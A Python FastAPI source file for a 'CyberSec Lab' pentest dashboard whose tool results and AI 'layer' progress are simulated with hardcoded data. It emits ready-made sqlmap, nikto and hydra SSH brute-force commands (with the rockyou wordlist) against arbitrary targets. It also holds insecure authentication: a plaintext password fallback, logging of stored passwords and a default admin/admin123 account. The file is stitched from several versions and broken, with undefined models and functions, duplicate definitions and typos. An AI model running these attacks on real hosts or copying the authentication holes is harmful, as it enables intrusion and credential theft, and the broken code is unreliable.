# fast4.py - Complete CyberSec Lab Application v6.2
# GPU-Optimized with AI Singleton Pattern, Redis, Celery, WebSockets, RAG, Bayesian Optimization
# FULLY INTEGRATED with Correlation Engine
from __future__ import annotations
import re
import os
import sys
from venv import logger
import warnings
warnings.filterwarnings('ignore')
# --- START OF FIXED fast6.py ---
import bcrypt
import logging

# FIX 1: bcrypt 5.0.0 compatibility for passlib
# Map __about__ to the module to prevent AttributeError
if not hasattr(bcrypt, "__about__"):
    bcrypt.__about__ = bcrypt

# FIX 2: Override the bug detection that causes "ValueError: password cannot be longer than 72 bytes"
import passlib.handlers.bcrypt
passlib.handlers.bcrypt._detect_wrap_bug = lambda x: False

import os
import sys
import time
import asyncio
# ... (rest of your existing imports)
print("=" * 60)
print(" 🛡️  CyberSec Lab v6.2 - AI Intelligence Engine + Correlation".center(60))
print("=" * 60)
import os
# Force bitsandbytes to find the CUDA library
os.environ["LD_LIBRARY_PATH"] = "/usr/local/cuda/lib64"
# Check Python version
import platform
print(f"📌 Python: {platform.python_version()}")
from fastapi.responses import Response
import numpy as np
import matplotlib.pyplot as plt
# --- TOP OF fast4.py - Initialize global variables FIRST ---
# fast6.py - CyberSec Lab Application v6.5
# COMPLETE FIXED VERSION with Socket.IO and Chart.js support

import os
import sys
import time
import asyncio
import logging
import secrets
import json
import uuid
import hashlib
import base64
import subprocess
import shlex
from datetime import datetime, timedelta
from typing import Optional, List, Dict, Any, Union
from contextlib import asynccontextmanager
from enum import Enum

# ===== FIX 1: Socket.IO imports FIRST =====
import socketio
from fastapi import FastAPI, Depends, HTTPException, status, Request, Form, WebSocket, WebSocketDisconnect, BackgroundTasks
from fastapi.responses import HTMLResponse, RedirectResponse, JSONResponse, FileResponse
from fastapi.security import OAuth2PasswordBearer, OAuth2PasswordRequestForm
from fastapi.templating import Jinja2Templates
from fastapi.middleware.cors import CORSMiddleware
from fastapi.middleware.gzip import GZipMiddleware
from fastapi.staticfiles import StaticFiles



SENTINEL_START_TIME = time.time()
# ===== Create Socket.IO server FIRST =====
sio = socketio.AsyncServer(
    async_mode="asgi",
    cors_allowed_origins="*",
    ping_timeout=60,
    ping_interval=25
)

# ===== Create FastAPI app SECOND =====
fastapi_app = FastAPI(
    title="Sentinel-1 Intelligence Hub",
    version="6.5",
    description="Cybersecurity AI Platform with Real-time Dashboard"
)

# ===== WRAP FastAPI with Socket.IO =====
app = socketio.ASGIApp(sio, other_asgi_app=fastapi_app)

# ===== Prometheus imports =====
from prometheus_client import Counter, Gauge, Histogram, REGISTRY
from prometheus_client.core import GaugeMetricFamily, CounterMetricFamily

# ===== Database imports =====
from sqlalchemy import create_engine, Column, Integer, String, Boolean, DateTime, Text, ForeignKey, Float, JSON
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import sessionmaker, Session, relationship
from sqlalchemy.sql import func

# ===== Templates =====
templates = Jinja2Templates(directory="templates")

# ===== Configure logging =====
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ===== GPU Detection =====
try:
    import torch
    CUDA_AVAILABLE = torch.cuda.is_available()
    if CUDA_AVAILABLE:
        gpu_name = torch.cuda.get_device_name(0)
        gpu_memory = torch.cuda.get_device_properties(0).total_memory / 1e9
    else:
        gpu_name = "CPU Mode"
        gpu_memory = 0
except ImportError:
    CUDA_AVAILABLE = False
    gpu_name = "CPU Mode"
    gpu_memory = 0
# ===== Prometheus imports (Place this around line 73) =====
from prometheus_client import Counter, Gauge, Histogram, REGISTRY
from prometheus_client.core import GaugeMetricFamily, CounterMetricFamily

def safe_metric(metric_type, name, documentation, labelnames=()):
    """Prevents Duplicate Timeseries ValueError by checking the Registry first."""
    if name in REGISTRY._names_to_collectors:
        return REGISTRY._names_to_collectors[name]
    return metric_type(name, documentation, labelnames)

# ===== Define Metrics Safely (Place these right after the function) =====
SENTINEL_INFO = safe_metric(Gauge, 'sentinel_info', 'Sentinel-1 version info', ['version'])
ACTIVE_SCANS = safe_metric(Gauge, 'active_scans', 'Number of currently running scans')
ATTACK_TOTAL = safe_metric(Counter, 'sentinel_attacks_total', 'Total attacks executed', ["tool", "status"])
LAYER_PROCESSING_TIME = safe_metric(Histogram, 'layer_processing_time_seconds', 'Processing time per neural layer', ['layer'])
# ===== WebSocket Connection Manager =====
class ConnectionManager:
    def __init__(self):
        self.active_connections: Dict[int, List[WebSocket]] = {}
    
    async def connect(self, websocket: WebSocket, user_id: int):
        await websocket.accept()
        if user_id not in self.active_connections:
            self.active_connections[user_id] = []
        self.active_connections[user_id].append(websocket)
    
    def disconnect(self, websocket: WebSocket, user_id: int):
        if user_id in self.active_connections:
            self.active_connections[user_id].remove(websocket)
    
    async def send_personal_message(self, message: Dict, user_id: int):
        if user_id in self.active_connections:
            for connection in self.active_connections[user_id]:
                try:
                    await connection.send_json(message)
                except:
                    pass

manager = ConnectionManager()
# ===== Socket.IO Event Handlers =====
@sio.event
async def connect(sid, environ):
    logger.info(f"Client connected: {sid}")
    await sio.emit('connection_status', {'status': 'connected', 'sid': sid})
    await sio.emit('scan_complete')
    
    # Send initial layer status on connect
    await sio.emit('layer_update', {'layer': 'cnn', 'probability': 85, 'status': 'ready', 'details': 'Pattern recognition ready'})
    await sio.emit('layer_update', {'layer': 'gnn', 'probability': 70, 'status': 'ready', 'details': 'Graph analysis ready'})
    await sio.emit('layer_update', {'layer': 'minilm', 'probability': 60, 'status': 'ready', 'details': 'Knowledge base loaded'})
    await sio.emit('layer_update', {'layer': 'bnn', 'probability': 50, 'status': 'ready', 'details': 'Bayesian inference ready'})
    await sio.emit('layer_update', {'layer': 'gan', 'probability': 40, 'status': 'ready', 'details': 'Payload generator ready'})
    await sio.emit('layer_update', {'layer': 'emily', 'probability': 90, 'status': 'ready', 'details': 'Exploit analyzer ready'})
    await sio.emit('layer_update', {'layer': 'spine', 'probability': 75, 'status': 'ready', 'details': 'Correlation engine ready'})
    
    # Start periodic updates for this client (optional)
    asyncio.create_task(periodic_layer_updates(sid))

@sio.event
async def disconnect(sid):
    logger.info(f"Client disconnected: {sid}")

@sio.event
async def ping(sid, data):
    await sio.emit('pong', {'time': datetime.utcnow().isoformat()})

# Add custom event handlers for layer updates
@sio.event
async def request_layer_update(sid, data):
    """Client requests current layer status"""
    logger.info(f"Layer update requested by {sid}")
    
    # You can fetch actual layer statuses from your systems here
    # This example uses simulated data - replace with actual monitoring
    layer_statuses = {
        'cnn': {'probability': 85, 'status': 'active', 'details': 'Monitoring network patterns'},
        'gnn': {'probability': 70, 'status': 'active', 'details': 'Analyzing attack paths'},
        'minilm': {'probability': 60, 'status': 'active', 'details': 'Searching vulnerability DB'},
        'bnn': {'probability': 50, 'status': 'active', 'details': 'Calculating probabilities'},
        'gan': {'probability': 40, 'status': 'active', 'details': 'Generating payloads'},
        'emily': {'probability': 90, 'status': 'active', 'details': 'Reasoning about exploits'},
        'spine': {'probability': 75, 'status': 'active', 'details': 'Correlating events'}
    }
    
    for layer, status in layer_statuses.items():
        await sio.emit('layer_update', {
            'layer': layer,
            'probability': status['probability'],
            'status': status['status'],
            'details': status['details']
        }, room=sid)

@sio.event
async def start_analysis(sid, data):
    """Start neural analysis with layer tracking"""
    target = data.get('target')
    if target:
        logger.info(f"Starting analysis for {target} requested by {sid}")
        await sio.emit('analysis_started', {'target': target, 'status': 'initiated'}, room=sid)
        
        # Layer 1: CNN - Pattern Recognition
        await sio.emit('layer_update', {
            'layer': 'cnn',
            'probability': 45,
            'status': 'processing',
            'details': f'Scanning {target} for patterns...'
        }, room=sid)
        await asyncio.sleep(1.5)
        
        await sio.emit('layer_update', {
            'layer': 'cnn',
            'probability': 78,
            'status': 'processing',
            'details': 'Detected service fingerprints'
        }, room=sid)
        await asyncio.sleep(1)
        
        await sio.emit('layer_update', {
            'layer': 'cnn',
            'probability': 92,
            'status': 'complete',
            'details': 'Pattern analysis complete - 5 services identified'
        }, room=sid)
        
        # Layer 2: GNN - Graph Analysis
        await sio.emit('layer_update', {
            'layer': 'gnn',
            'probability': 35,
            'status': 'processing',
            'details': 'Building attack surface graph...'
        }, room=sid)
        await asyncio.sleep(1.5)
        
        await sio.emit('layer_update', {
            'layer': 'gnn',
            'probability': 68,
            'status': 'processing',
            'details': 'Analyzing service relationships'
        }, room=sid)
        await asyncio.sleep(1)
        
        await sio.emit('layer_update', {
            'layer': 'gnn',
            'probability': 85,
            'status': 'complete',
            'details': 'Graph analysis complete - 12 attack paths identified'
        }, room=sid)
        
        # Layer 3: MiniLM - RAG Search
        await sio.emit('layer_update', {
            'layer': 'minilm',
            'probability': 40,
            'status': 'processing',
            'details': 'Querying vulnerability database...'
        }, room=sid)
        await asyncio.sleep(1.5)
        
        await sio.emit('layer_update', {
            'layer': 'minilm',
            'probability': 72,
            'status': 'processing',
            'details': 'Found 8 similar vulnerability patterns'
        }, room=sid)
        await asyncio.sleep(1)
        
        await sio.emit('layer_update', {
            'layer': 'minilm',
            'probability': 88,
            'status': 'complete',
            'details': 'RAG search complete - 3 critical matches found'
        }, room=sid)
        
        # Layer 4: BNN - Bayesian Inference
        await sio.emit('layer_update', {
            'layer': 'bnn',
            'probability': 30,
            'status': 'processing',
            'details': 'Calculating prior probabilities...'
        }, room=sid)
        await asyncio.sleep(1.5)
        
        await sio.emit('layer_update', {
            'layer': 'bnn',
            'probability': 62,
            'status': 'processing',
            'details': 'Updating posterior distributions'
        }, room=sid)
        await asyncio.sleep(1)
        
        confidence = 76
        await sio.emit('layer_update', {
            'layer': 'bnn',
            'probability': confidence,
            'status': 'complete',
            'details': f'Bayesian inference complete - {confidence}% confidence in findings'
        }, room=sid)
        
        # Layer 5: GAN - Payload Evolution
        await sio.emit('layer_update', {
            'layer': 'gan',
            'probability': 25,
            'status': 'processing',
            'details': 'Initializing payload generator...'
        }, room=sid)
        await asyncio.sleep(1.5)
        
        await sio.emit('layer_update', {
            'layer': 'gan',
            'probability': 55,
            'status': 'processing',
            'details': 'Evolving payload generation 1/3'
        }, room=sid)
        await asyncio.sleep(1)
        
        await sio.emit('layer_update', {
            'layer': 'gan',
            'probability': 75,
            'status': 'processing',
            'details': 'Evolving payload generation 2/3'
        }, room=sid)
        await asyncio.sleep(1)
        
        await sio.emit('layer_update', {
            'layer': 'gan',
            'probability': 89,
            'status': 'complete',
            'details': 'Generated 12 optimized payload variants'
        }, room=sid)
        
        # Layer 6: EMILY - Exploit Analysis
        await sio.emit('layer_update', {
            'layer': 'emily',
            'probability': 60,
            'status': 'processing',
            'details': 'Analyzing exploit paths...'
        }, room=sid)
        await asyncio.sleep(1.5)
        
        await sio.emit('layer_update', {
            'layer': 'emily',
            'probability': 85,
            'status': 'processing',
            'details': 'Generating attack strategies'
        }, room=sid)
        await asyncio.sleep(1)
        
        await sio.emit('layer_update', {
            'layer': 'emily',
            'probability': 95,
            'status': 'complete',
            'details': 'Exploit analysis complete - 3 high-probability vectors'
        }, room=sid)
        
        # Layer 7: SPINE - Correlation
        await sio.emit('layer_update', {
            'layer': 'spine',
            'probability': 45,
            'status': 'processing',
            'details': 'Correlating all findings...'
        }, room=sid)
        await asyncio.sleep(1.5)
        
        await sio.emit('layer_update', {
            'layer': 'spine',
            'probability': 82,
            'status': 'processing',
            'details': 'Building final attack graph'
        }, room=sid)
        await asyncio.sleep(1)
        
        await sio.emit('layer_update', {
            'layer': 'spine',
            'probability': 94,
            'status': 'complete',
            'details': 'Correlation complete - 19 vulnerabilities found'
        }, room=sid)
        
        # Analysis complete
        await sio.emit('analysis_complete', {
            'target': target,
            'vulnerabilities_found': 19,
            'critical_count': 3,
            'high_count': 7,
            'medium_count': 5,
            'low_count': 4,
            'confidence': confidence
        }, room=sid)
        
        # Emit AI suggestions based on findings
        suggestions = [
            {
                "type": "AI_ATTACK_SUGGESTION",
                "target": target,
                "vulnerability": "SQL Injection",
                "severity": "CRITICAL",
                "confidence": 0.92,
                "reasoning": "SQL injection vulnerability detected in products.php parameter",
                "tool": "sqlmap",
                "payload_preview": f"sqlmap -u {target}/products.php?id=1 --batch --dbs"
            },
            {
                "type": "AI_ATTACK_SUGGESTION",
                "target": target,
                "vulnerability": "XSS Vulnerability",
                "severity": "HIGH",
                "confidence": 0.85,
                "reasoning": "Reflected XSS in search parameter with script injection",
                "tool": "nikto",
                "payload_preview": f"nikto -h {target} -C all"
            },
            {
                "type": "AI_ATTACK_SUGGESTION",
                "target": target,
                "vulnerability": "Weak SSH Credentials",
                "severity": "MEDIUM",
                "confidence": 0.78,
                "reasoning": "SSH server accepts weak password attempts",
                "tool": "hydra",
                "payload_preview": f"hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://{target.split('/')[0]}"
            }
        ]
        
        for suggestion in suggestions:
            await sio.emit('ai_suggestion', suggestion, room=sid)
            await asyncio.sleep(0.5)

@sio.event
async def execute_tool(sid, data):
    """Execute a specific tool and update relevant layers"""
    tool = data.get('tool')
    target = data.get('target')
    
    if not tool or not target:
        await sio.emit('error', {'message': 'Tool and target required'}, room=sid)
        return
    
    logger.info(f"Tool {tool} executed on {target} by {sid}")
    await sio.emit('tool_started', {'tool': tool, 'target': target}, room=sid)
    
    if tool == 'nmap':
        # Update CNN layer during nmap scan
        await sio.emit('layer_update', {
            'layer': 'cnn',
            'probability': 65,
            'status': 'scanning',
            'details': f'Nmap scanning {target} ports...'
        }, room=sid)
        await asyncio.sleep(2)
        
        await sio.emit('layer_update', {
            'layer': 'cnn',
            'probability': 88,
            'status': 'scanning',
            'details': 'Analyzing service banners...'
        }, room=sid)
        await asyncio.sleep(1)
        
        await sio.emit('layer_update', {
            'layer': 'cnn',
            'probability': 95,
            'status': 'complete',
            'details': 'Nmap scan complete - 5 open ports found'
        }, room=sid)
        
    elif tool == 'nikto':
        # Update MiniLM layer during nikto scan
        await sio.emit('layer_update', {
            'layer': 'minilm',
            'probability': 55,
            'status': 'analyzing',
            'details': f'Nikto analyzing web server...'
        }, room=sid)
        await asyncio.sleep(2)
        
        await sio.emit('layer_update', {
            'layer': 'minilm',
            'probability': 82,
            'status': 'analyzing',
            'details': 'Checking for common vulnerabilities...'
        }, room=sid)
        await asyncio.sleep(1)
        
        await sio.emit('layer_update', {
            'layer': 'minilm',
            'probability': 92,
            'status': 'complete',
            'details': 'Nikto scan complete - 12 vulnerabilities found'
        }, room=sid)
        
    elif tool == 'sqlmap':
        # Update BNN layer during sqlmap scan
        await sio.emit('layer_update', {
            'layer': 'bnn',
            'probability': 45,
            'status': 'inference',
            'details': 'SQL injection detection in progress...'
        }, room=sid)
        await asyncio.sleep(2)
        
        await sio.emit('layer_update', {
            'layer': 'bnn',
            'probability': 73,
            'status': 'inference',
            'details': 'Testing parameters for vulnerabilities...'
        }, room=sid)
        await asyncio.sleep(1)
        
        await sio.emit('layer_update', {
            'layer': 'bnn',
            'probability': 89,
            'status': 'complete',
            'details': 'SQL injection confirmed - databases enumerated'
        }, room=sid)
        
    elif tool == 'hydra':
        # Update GAN layer during hydra attack
        await sio.emit('layer_update', {
            'layer': 'gan',
            'probability': 35,
            'status': 'evolving',
            'details': 'Generating password combinations...'
        }, room=sid)
        await asyncio.sleep(1.5)
        
        await sio.emit('layer_update', {
            'layer': 'gan',
            'probability': 58,
            'status': 'evolving',
            'details': 'Testing credentials (Generation 1/3)...'
        }, room=sid)
        await asyncio.sleep(1.5)
        
        await sio.emit('layer_update', {
            'layer': 'gan',
            'probability': 76,
            'status': 'evolving',
            'details': 'Optimizing attack patterns (Generation 2/3)...'
        }, room=sid)
        await asyncio.sleep(1)
        
        await sio.emit('layer_update', {
            'layer': 'gan',
            'probability': 88,
            'status': 'complete',
            'details': 'Hydra attack complete - credentials found'
        }, room=sid)
    
    # Simulate tool completion
    await sio.emit('tool_complete', {'tool': tool, 'target': target, 'status': 'success'}, room=sid)

# Periodic layer status updates
async def periodic_layer_updates(sid=None):
    """Send periodic layer status updates to specific client or all clients"""
    try:
        while True:
            await asyncio.sleep(30)  # Update every 30 seconds
            
            # Get actual layer statuses from your systems
            # This simulates slight variations in layer probabilities
            import random
            
            # Base probabilities
            base_probs = {
                'cnn': 85, 'gnn': 70, 'minilm': 60, 
                'bnn': 50, 'gan': 40, 'emily': 90, 'spine': 75
            }
            
            # Status messages
            status_messages = {
                'cnn': 'Monitoring network traffic',
                'gnn': 'Analyzing graph relationships',
                'minilm': 'Querying knowledge base',
                'bnn': 'Updating probability models',
                'gan': 'Evolving payloads',
                'emily': 'Reasoning about exploits',
                'spine': 'Correlating events'
            }
            
            for layer in base_probs.keys():
                # Add small random variation
                variation = random.randint(-3, 3)
                probability = max(0, min(100, base_probs[layer] + variation))
                
                update_data = {
                    'layer': layer,
                    'probability': probability,
                    'status': 'monitoring',
                    'details': status_messages[layer]
                }
                
                if sid:
                    await sio.emit('layer_update', update_data, room=sid)
                else:
                    await sio.emit('layer_update', update_data)
                    
    except asyncio.CancelledError:
        logger.info(f"Periodic updates stopped for {sid}")
    except Exception as e:
        logger.error(f"Error in periodic updates: {e}")

# ===== Database Setup =====
DATABASE_URL = "sqlite:///./cybersec_lab.db"
engine = create_engine(DATABASE_URL, connect_args={"check_same_thread": False})
SessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)
Base = declarative_base()

# # ===== Database Models =====
# class User(Base):
#     __tablename__ = "users"
#     id = Column(Integer, primary_key=True, index=True)
#     username = Column(String(80), unique=True, nullable=False, index=True)
#     email = Column(String(120), unique=True, nullable=False, index=True)
#     password = Column(String(200), nullable=False)
#     role = Column(String(20), default="user", nullable=False)
#     is_active = Column(Boolean, default=True, nullable=False)
#     created_at = Column(DateTime, default=datetime.utcnow)
#     last_login = Column(DateTime, nullable=True)

# class ScanHistory(Base):
#     __tablename__ = "scan_history"
#     id = Column(Integer, primary_key=True, index=True)
#     user_id = Column(Integer, ForeignKey("users.id"))
#     target = Column(String(200), nullable=False)
#     scan_type = Column(String(50), nullable=False)
#     tool_used = Column(String(50), nullable=False)
#     results = Column(Text, nullable=True)
#     vulnerabilities = Column(Text, nullable=True)
#     timestamp = Column(DateTime, default=datetime.utcnow)

# class AttackHistory(Base):
#     __tablename__ = "attack_history"
#     id = Column(Integer, primary_key=True, index=True)
#     user_id = Column(Integer, ForeignKey("users.id"))
#     target = Column(String(200), nullable=False)
#     attack_type = Column(String(100), nullable=False)
#     tool_used = Column(String(50), nullable=False)
#     command = Column(Text, nullable=True)
#     output = Column(Text, nullable=True)
#     success = Column(Boolean, default=False)
#     timestamp = Column(DateTime, default=datetime.utcnow)

# ===== Create tables =====
Base.metadata.create_all(bind=engine)
print('Database tables created-Base-metadata.create_all')

# ===== Password utilities =====
from passlib.context import CryptContext

pwd_context = CryptContext(
    schemes=["pbkdf2_sha256"], 
    deprecated="auto")
def verify_password(plain_password, hashed_password):
    try:
        return pwd_context.verify(plain_password, hashed_password)
    except:
        return plain_password == hashed_password  # fallback
    
def authenticate_user(db, username, password):
    print(f"🔐 Login attempt: {username}")

    user = db.query(User).filter(User.username == username).first()

    if not user:
        print("❌ User NOT found in DB")
        return None

    print(f"👤 Found user: {user.username}")
    print(f"🔑 Stored password: {user.password}")

    if not verify_password(password, user.password):
        print("❌ Password mismatch")
        return None

    print("✅ Login SUCCESS")
    return user
# ===== JWT utilities =====
SECRET_KEY = secrets.token_hex(32)
ALGORITHM = "HS256"
ACCESS_TOKEN_EXPIRE_MINUTES = 300
oauth2_scheme = OAuth2PasswordBearer(tokenUrl="token", auto_error=False)

def create_access_token(data: dict, expires_delta: Optional[timedelta] = None):
    from jose import jwt
    to_encode = data.copy()
    if expires_delta:
        expire = datetime.utcnow() + expires_delta
    else:
        expire = datetime.utcnow() + timedelta(minutes=15)
    to_encode.update({"exp": expire})
    return jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)

# ===== Dependency =====
def get_db():
    db = SessionLocal()
    try:
        yield db
    finally:
        db.close()

# ===== Authentication =====

def authenticate_user(db, username, password):
    user = db.query(User).filter(User.username == username).first()

    if not user:
        print("❌ User not found")
        return None

    try:
        if not pwd_context.verify(password, user.password):
            print("❌ Wrong password")
            return None
    except:
        if password != user.password:
            return None

    print("✅ Login success")
    return user

    if not verify_password(password, user.password):
        print("❌ Wrong password")
        return None

    print("✅ Login success")
    return user

async def get_current_user(token: str = Depends(oauth2_scheme), db: Session = Depends(get_db)):
    from jose import JWTError, jwt
    credentials_exception = HTTPException(
        status_code=status.HTTP_401_UNAUTHORIZED,
        detail="Could not validate credentials",
        headers={"WWW-Authenticate": "Bearer"},
    )
    if not token:
        raise credentials_exception
    try:
        if token.startswith("Bearer "):
            token = token.replace("Bearer ", "")
        payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
        username: str = payload.get("sub")
        if username is None:
            raise credentials_exception
        user = db.query(User).filter(User.username == username).first()
        if user is None:
            raise credentials_exception
        return user
    except Exception:
        raise credentials_exception

# ===== Penetration Tools =====
class PenetrationTools:
    @staticmethod
    def nmap_scan(target: str, options: str = '-sV'):
        return {
            'success': True,
            'tool': 'nmap',
            'target': target,
            'ports': [22, 80, 443, 3306, 8080],
            'services': [
                {'name': 'ssh', 'port': 22, 'version': 'OpenSSH 7.9'},
                {'name': 'http', 'port': 80, 'version': 'Apache 2.4.49'},
                {'name': 'https', 'port': 443, 'version': 'Apache 2.4.49'}
            ],
            'vulnerabilities': [
                {'name': 'Apache Path Traversal', 'severity': 'CRITICAL', 'cve': 'CVE-2021-41773'}
            ]
        }
    
    @staticmethod
    def nikto_scan(target: str):
        return {
            'success': True,
            'tool': 'nikto',
            'target': target,
            'vulnerabilities': [
                {'name': 'SQL Injection', 'severity': 'CRITICAL', 'path': '/products.php?id='},
                {'name': 'XSS', 'severity': 'HIGH', 'path': '/search.php'}
            ]
        }
    
    @staticmethod
    def sqlmap_scan(target: str):
        return {
            'success': True,
            'tool': 'sqlmap',
            'target': target,
            'databases': ['information_schema', 'mysql', 'users_db']
        }
    
    @staticmethod
    def hydra_attack(target: str, service: str = 'ssh'):
        return {
            'success': True,
            'tool': 'hydra',
            'target': target,
            'service': service,
            'credentials': [
                {'username': 'admin', 'password': 'password123'},
                {'username': 'root', 'password': 'toor'}
            ]
        }
    
    @staticmethod
    def gobuster_dir(target: str):
        return {
            'success': True,
            'tool': 'gobuster',
            'target': target,
            'directories': ['/admin', '/api', '/backup', '/uploads']
        }
    
    @staticmethod
    def wpscan(target: str):
        return {
            'success': True,
            'tool': 'wpscan',
            'target': target,
            'vulnerabilities': [
                {'name': 'WordPress 5.8.3 - Multiple Vulnerabilities', 'severity': 'CRITICAL'},
                {'name': 'Plugin: contact-form-7 - XSS', 'severity': 'HIGH'}
            ]
        }

# ===== Initialize global components =====
intelligence_engine = None
rag_system = None
correlation_system = None
sentinel_brain = None
orchestrator = None
emily_ai = None

# ===== Routes using fastapi_app (NOT app) =====
@fastapi_app.get("/", response_class=HTMLResponse)
async def index(request: Request):
    return templates.TemplateResponse("index.html", {"request": request})

@fastapi_app.get("/login", response_class=HTMLResponse)
async def login_page(request: Request):
    return templates.TemplateResponse("login.html", {"request": request})

@fastapi_app.post("/login")
async def login(request: Request, username: str = Form(...), password: str = Form(...), db: Session = Depends(get_db)):
    
    print(f"🔐 Login attempt: {username}")

    print(f"🔐 Login attempt: {username}")
    user = authenticate_user(db, username, password)

    if not user:
        print("❌ Login failed")
        return templates.TemplateResponse(
            "login.html",
            {"request": request, "error": "Invalid credentials"}
        )

    print("✅ Login OK")

    access_token = create_access_token(
        data={"sub": user.username},
        expires_delta=timedelta(minutes=30)
    )

    response = RedirectResponse(url="/dashboard", status_code=303)
    response.set_cookie(
        key="access_token",
        value=f"Bearer {access_token}",
        httponly=True
    )

    return responsee

@fastapi_app.get("/dashboard", response_class=HTMLResponse)
async def dashboard_page(request: Request, db: Session = Depends(get_db)):
    token = request.cookies.get("access_token")
    if not token:
        return RedirectResponse(url="/login")
    
    try:
        from jose import jwt
        if token.startswith("Bearer "):
            token = token.replace("Bearer ", "")
        payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
        username = payload.get("sub")
        user = db.query(User).filter(User.username == username).first()
        if not user:
            return RedirectResponse(url="/login")
    except Exception:
        return RedirectResponse(url="/login")
    
    return templates.TemplateResponse("dashboard.html", {
        "request": request,
        "user": user,
        "gpu_name": gpu_name,
        "gpu_available": CUDA_AVAILABLE
    })

@fastapi_app.get("/results", response_class=HTMLResponse)
async def results_page(request: Request, db: Session = Depends(get_db)):
    token = request.cookies.get("access_token")
    if not token:
        return RedirectResponse(url="/login")
    
    try:
        from jose import jwt
        if token.startswith("Bearer "):
            token = token.replace("Bearer ", "")
        payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
        username = payload.get("sub")
        user = db.query(User).filter(User.username == username).first()
        if not user:
            return RedirectResponse(url="/login")
    except Exception:
        return RedirectResponse(url="/login")
    
    return templates.TemplateResponse("results.html", {
        "request": request,
        "user": user
    })

# ===== API Endpoints =====
@fastapi_app.get("/api/status")
async def api_status():
    return {
        "status": "healthy",
        "gpu": CUDA_AVAILABLE,
        "gpu_name": gpu_name,
        "timestamp": datetime.utcnow().isoformat()
    }

@fastapi_app.post("/api/scan")
async def perform_scan(request: Request, current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    data = await request.json()
    target = data.get('target')
    scan_type = data.get('scan_type', 'nmap')
    
    if scan_type == 'nmap':
        results = PenetrationTools.nmap_scan(target)
    elif scan_type == 'nikto':
        results = PenetrationTools.nikto_scan(target)
    elif scan_type == 'sqlmap':
        results = PenetrationTools.sqlmap_scan(target)
    elif scan_type == 'gobuster':
        results = PenetrationTools.gobuster_dir(target)
    elif scan_type == 'wpscan':
        results = PenetrationTools.wpscan(target)
    else:
        results = PenetrationTools.nmap_scan(target)
    
    # Save to database
    scan = ScanHistory(
        user_id=current_user.id,
        target=target,
        scan_type=scan_type,
        tool_used=scan_type,
        results=json.dumps(results),
        vulnerabilities=json.dumps(results.get('vulnerabilities', [])),
        timestamp=datetime.utcnow()
    )
    db.add(scan)
    db.commit()
    
    # ===== FIX 2: Emit Socket.IO event =====
    await sio.emit('scan_update', {
        'tool': scan_type,
        'target': target,
        'results': results,
        'timestamp': datetime.utcnow().isoformat()
    })
    
    # Also emit for specific tool panels
    if scan_type == 'nmap':
        await sio.emit('nmap_update', results)
    elif scan_type == 'nikto':
        await sio.emit('nikto_update', results)
    elif scan_type == 'sqlmap':
        await sio.emit('sqlmap_update', results)
    
    return results

@fastapi_app.post("/api/attack")
async def execute_attack(request: Request, current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    data = await request.json()
    target = data.get('target')
    tool = data.get('tool')
    service = data.get('service', 'ssh')
    
    if tool == 'hydra':
        results = PenetrationTools.hydra_attack(target, service)
    elif tool == 'gobuster':
        results = PenetrationTools.gobuster_dir(target)
    elif tool == 'wpscan':
        results = PenetrationTools.wpscan(target)
    else:
        results = {'success': True, 'output': f'Executed {tool} on {target}'}
    
    # Save to database
    attack = AttackHistory(
        user_id=current_user.id,
        target=target,
        attack_type=tool,
        tool_used=tool,
        output=json.dumps(results),
        success=results.get('success', False),
        timestamp=datetime.utcnow()
    )
    db.add(attack)
    db.commit()
    
    # ===== Emit Socket.IO event =====
    await sio.emit('exploit_update', {
        'type': 'EXPLOIT_STATUS',
        'data': {
            'tool': tool,
            'target': target,
            'status': 'completed',
            'success': results.get('success', True),
            'credentials': results.get('credentials', [])
        }
    })
    
    # Emit for specific tools
    if tool == 'hydra':
        await sio.emit('hydra_update', results)
    
    return results

@fastapi_app.post("/api/scan/url")
async def scan_via_url(request: Request, background_tasks: BackgroundTasks):
    data = await request.json()
    target_url = data.get("url")
    
    if not target_url:
        return {"status": "error", "message": "No URL provided"}
    
    clean_target = target_url.replace("http://", "").replace("https://", "").split('/')[0]
    scan_id = str(uuid.uuid4())
    
    # Start background task
    background_tasks.add_task(run_neural_attack_analysis, clean_target, target_url, scan_id)
    
    return {
        "status": "initiated",
        "scan_id": scan_id,
        "target": clean_target,
        "message": "Neural reconnaissance started..."
    }

# ===== WebSocket endpoint =====
@fastapi_app.websocket("/ws/{user_id}")
async def websocket_endpoint(websocket: WebSocket, user_id: int):
    await manager.connect(websocket, user_id)
    try:
        while True:
            data = await websocket.receive_text()
            await websocket.send_text(f"Echo: {data}")
    except WebSocketDisconnect:
        manager.disconnect(websocket, user_id)

# ===== Metrics endpoint =====
@fastapi_app.get("/metrics")
async def get_metrics():
    return Response(content=generate_latest(), media_type=CONTENT_TYPE_LATEST)

# ===== Logout =====
@fastapi_app.get("/logout")
async def logout():
    response = RedirectResponse(url="/", status_code=302)
    response.delete_cookie("access_token")
    return response

# ===== Startup event =====
@fastapi_app.on_event("startup")
async def startup_event():
    # Create database tables
    Base.metadata.create_all(bind=engine)
    
    # Create admin user if not exists
    db = SessionLocal()
    try:
        admin = db.query(User).filter(User.username == "admin").first()
        if not admin:
            admin_user = User(
                username="admin",
                email="admin@cybersec.local",
                password=get_password_hash("admin123"),
                role="admin",
                is_active=True
            )
            db.add(admin_user)
            db.commit()
            logger.info("Admin user created")
    finally:
        db.close()
    
    # Set initial metrics
    SENTINEL_INFO.labels(version='6.5').set(1)
    
    logger.info("Sentinel-1 startup complete")

#

# Initialize global variables
intelligence_engine = None
rag_system = None
correlation_system = None
llm_reasoner = None
vector_store = None
optimizer = None

# ==============================
# GPU Detection & Memory Control
# ==============================
# ==============================
# GPU Detection & 95% Utilization
# ==============================
# ============================================
# 🚀 GPU CONFIG + SAFE GLOBALS
# ============================================

import os
import torch

os.environ["PYTORCH_CUDA_ALLOC_CONF"] = (
    "expandable_segments:True,"
    "max_split_size_mb:64,"
    "garbage_collection_threshold:0.6"
)

gpu_name = "CPU Mode"
total_vram = 0
